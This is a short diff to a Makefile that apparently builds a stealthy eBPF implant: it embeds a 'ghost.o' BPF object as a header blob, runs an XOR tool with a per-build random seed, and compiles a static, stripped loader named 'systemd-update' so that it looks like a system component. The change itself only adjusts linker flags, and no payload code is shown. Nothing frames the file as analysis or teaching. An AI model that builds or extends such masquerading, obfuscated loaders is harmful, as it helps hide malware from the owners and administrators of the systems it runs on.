@@ -1,6 +1,7 @@
 CC = clang
 SEED = $(shell head -c 4 /dev/urandom | xxd -p)
-CFLAGS = -O3 -Wall -DSEED_VAL=0x$(SEED) -static
+# Added -lelf for guaranteed ELF parsing
+CFLAGS = -O3 -Wall -DSEED_VAL=0x$(SEED) -lelf -static
 
 all: prep xor_tool bpf header loader clean_tmp
 
@@ -19,7 +20,7 @@ header:
 	cd target && xxd -i ghost.o > ../src/ghost_blob.h
 
 loader:
-	$(CC) $(CFLAGS) src/loader.c -o target/systemd-update
+	$(CC) src/loader.c $(CFLAGS) -o target/systemd-update
 	strip -s target/systemd-update
 
 clean_tmp:
